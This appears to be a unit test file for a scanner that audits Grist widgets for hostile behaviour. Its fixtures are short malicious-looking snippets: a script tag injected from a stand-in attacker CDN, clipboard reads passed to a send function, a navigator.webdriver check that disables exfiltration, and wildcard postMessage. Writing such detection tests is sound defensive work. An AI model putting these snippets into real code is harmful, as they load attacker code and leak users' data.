import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  analyserEmpreinteAutomatisation,
  analyserPersistanceHorsWidget,
  analyserEmissionPostMessage,
  analyserPressePapiers,
  analyserScriptDynamique,
  analyserCspPermissive,
  analyserImportDynamique,
} from '../src/regles/c-securite.js';

function fichier(chemin, contenu, extra = {}) {
  return { chemin, contenu, lignes: contenu.split('\n'), ext: chemin.slice(chemin.lastIndexOf('.')), binaire: false, executee: true, vendorise: false, ...extra };
}

/** Chaque constat doit donner emplacement, explication et correctif : jamais l'un sans les autres. */
function assertTroisChoses(c) {
  assert.ok(c.fichier, 'emplacement manquant (fichier)');
  assert.ok(c.ligne, 'emplacement manquant (ligne)');
  assert.ok(c.constat && c.constat.length > 10, 'explication manquante');
  assert.ok(c.remediation && c.remediation.length > 10, 'action corrective manquante');
}

test('C-FINGERPRINT-01 détecte la lecture de navigator.webdriver', () => {
  const ctx = { fichiers: [fichier('app.js', 'if (navigator.webdriver) { desactiverExfiltration(); }')] };
  const constats = analyserEmpreinteAutomatisation(ctx);
  const c = constats.find((x) => x.regle === 'C-FINGERPRINT-01');
  assert.ok(c);
  assertTroisChoses(c);
  assert.equal(c.ligne, 1);
});

test("C-FINGERPRINT-01 ne se déclenche pas sans navigator.webdriver", () => {
  const ctx = { fichiers: [fichier('app.js', 'if (navigator.onLine) { sync(); }')] };
  const constats = analyserEmpreinteAutomatisation(ctx);
  assert.equal(constats.filter((x) => x.regle === 'C-FINGERPRINT-01').length, 0);
});

test('C-PERSIST-01 détecte serviceWorker.register et caches.open, agrège en un seul constat', () => {
  const contenu = [
    "navigator.serviceWorker.register('/sw.js');",
    "caches.open('mon-cache').then((c) => c.add('/x'));",
  ].join('\n');
  const ctx = { fichiers: [fichier('app.js', contenu)] };
  const constats = analyserPersistanceHorsWidget(ctx);
  const c = constats.find((x) => x.regle === 'C-PERSIST-01');
  assert.ok(c);
  assertTroisChoses(c);
  assert.equal(c.ligne, 1, 'doit pointer la première occurrence');
  assert.equal(c.preuve.emplacements.length, 2, 'les deux mécanismes doivent être exhaustivement listés');
});

test('C-PM-02 détecte postMessage avec targetOrigin littéral "*"', () => {
  const ctx = { fichiers: [fichier('app.js', "window.parent.postMessage({secret: x}, '*');")] };
  const constats = analyserEmissionPostMessage(ctx);
  const c = constats.find((x) => x.regle === 'C-PM-02');
  assert.ok(c);
  assertTroisChoses(c);
});

test("C-PM-02 ne se déclenche pas quand l'origine est explicite", () => {
  const ctx = { fichiers: [fichier('app.js', "window.parent.postMessage(msg, 'https://docs.getgrist.com');")] };
  const constats = analyserEmissionPostMessage(ctx);
  assert.equal(constats.filter((x) => x.regle === 'C-PM-02').length, 0);
});

test("C-PM-02 exempte grist-plugin-api.js, dont le transport RPC officiel utilise '*'", () => {
  const ctx = { fichiers: [fichier('grist-plugin-api.js', "window.parent.postMessage(msg, '*');")] };
  const constats = analyserEmissionPostMessage(ctx);
  assert.equal(constats.filter((x) => x.regle === 'C-PM-02').length, 0);
});

test('C-CLIP-01 détecte la lecture du presse-papiers', () => {
  const ctx = { fichiers: [fichier('app.js', 'navigator.clipboard.readText().then((t) => envoyer(t));')] };
  const constats = analyserPressePapiers(ctx);
  const c = constats.find((x) => x.regle === 'C-CLIP-01');
  assert.ok(c);
  assertTroisChoses(c);
});

test('C-EXFIL-05 détecte un <script> créé dynamiquement vers un hôte externe littéral (bloquant)', () => {
  const contenu = [
    "const s = document.createElement('script');",
    "s.src = 'https://cdn.malveillant.example/x.js';",
    'document.body.appendChild(s);',
  ].join('\n');
  const ctx = { fichiers: [fichier('app.js', contenu)] };
  const constats = analyserScriptDynamique(ctx);
  const c = constats.find((x) => x.regle === 'C-EXFIL-05');
  assert.ok(c);
  assertTroisChoses(c);
  assert.equal(c.ligne, 2, "doit pointer l'affectation de .src, pas la création de l'élément");
  assert.equal(c.bloquant, true);
  assert.equal(c.severite, 'critique');
});

test('C-EXFIL-05 traite une source calculée à l\'exécution comme une question ouverte, pas bloquante', () => {
  const contenu = [
    "const s = document.createElement('script');",
    's.src = base + suffixe;',
    'document.body.appendChild(s);',
  ].join('\n');
  const ctx = { fichiers: [fichier('app.js', contenu)] };
  const constats = analyserScriptDynamique(ctx);
  const c = constats.find((x) => x.regle === 'C-EXFIL-05');
  assert.ok(c);
  assert.equal(c.bloquant, false);
  assert.equal(c.confiance, 'a_verifier');
});

test("C-EXFIL-05 ne se déclenche pas pour un script pointé en local ou vers l'infrastructure Grist", () => {
  const contenu = [
    "const s1 = document.createElement('script');",
    "s1.src = '/grist-plugin-api.js';",
    "const s2 = document.createElement('script');",
    "s2.src = 'https://docs.getgrist.com/grist-plugin-api.js';",
  ].join('\n');
  const ctx = { fichiers: [fichier('app.js', contenu)] };
  const constats = analyserScriptDynamique(ctx);
  assert.equal(constats.filter((x) => x.regle === 'C-EXFIL-05').length, 0);
});

test("C-EXFIL-05 ne confond pas une simple image .src avec un script créé dynamiquement", () => {
  const contenu = [
    "const img = document.createElement('img');",
    "img.src = 'https://cdn.exemple.example/photo.png';",
  ].join('\n');
  const ctx = { fichiers: [fichier('app.js', contenu)] };
  const constats = analyserScriptDynamique(ctx);
  assert.equal(constats.filter((x) => x.regle === 'C-EXFIL-05').length, 0);
});

test("C-CSP-02 signale un joker '*' dans une CSP par ailleurs présente", () => {
  const html = '<html><head><meta http-equiv="Content-Security-Policy" content="default-src *"></head></html>';
  const ctx = { fichiers: [fichier('index.html', html)], entrees: ['index.html'] };
  const constats = analyserCspPermissive(ctx);
  const c = constats.find((x) => x.regle === 'C-CSP-02');
  assert.ok(c);
  assertTroisChoses(c);
  assert.match(c.constat, /\*/);
});

test("C-CSP-02 signale 'unsafe-inline' en script-src", () => {
  const html = '<html><head><meta http-equiv="Content-Security-Policy" content="default-src \'self\'; script-src \'self\' \'unsafe-inline\'"></head></html>';
  const ctx = { fichiers: [fichier('index.html', html)], entrees: ['index.html'] };
  const constats = analyserCspPermissive(ctx);
  const c = constats.find((x) => x.regle === 'C-CSP-02');
  assert.ok(c);
  assert.match(c.constat, /unsafe-inline/);
});

test("C-CSP-02 ne sanctionne pas 'unsafe-eval', nécessaire à grist-plugin-api.js", () => {
  const html = '<html><head><meta http-equiv="Content-Security-Policy" content="default-src \'none\'; script-src \'self\' https://docs.getgrist.com \'unsafe-eval\'"></head></html>';
  const ctx = { fichiers: [fichier('index.html', html)], entrees: ['index.html'] };
  const constats = analyserCspPermissive(ctx);
  assert.equal(constats.filter((x) => x.regle === 'C-CSP-02').length, 0);
});

test('C-CSP-02 ne se déclenche pas en cas d\'absence totale de CSP (rôle de C-CSP-01)', () => {
  const html = '<html><head></head></html>';
  const ctx = { fichiers: [fichier('index.html', html)], entrees: ['index.html'] };
  const constats = analyserCspPermissive(ctx);
  assert.equal(constats.length, 0);
});

test("C-EXFIL-06 détecte un import() dont la source est calculée à l'exécution", () => {
  const ctx = { fichiers: [fichier('app.js', "async function charger() { await import(base + '/module.js'); }")] };
  const constats = analyserImportDynamique(ctx);
  const c = constats.find((x) => x.regle === 'C-EXFIL-06');
  assert.ok(c);
  assertTroisChoses(c);
  assert.equal(c.confiance, 'a_verifier');
});

test("C-EXFIL-06 ne se déclenche pas sur un import() littéral (déjà couvert par C-EXFIL-01)", () => {
  const ctx = { fichiers: [fichier('app.js', "import('./local.js');")] };
  const constats = analyserImportDynamique(ctx);
  assert.equal(constats.filter((x) => x.regle === 'C-EXFIL-06').length, 0);
});
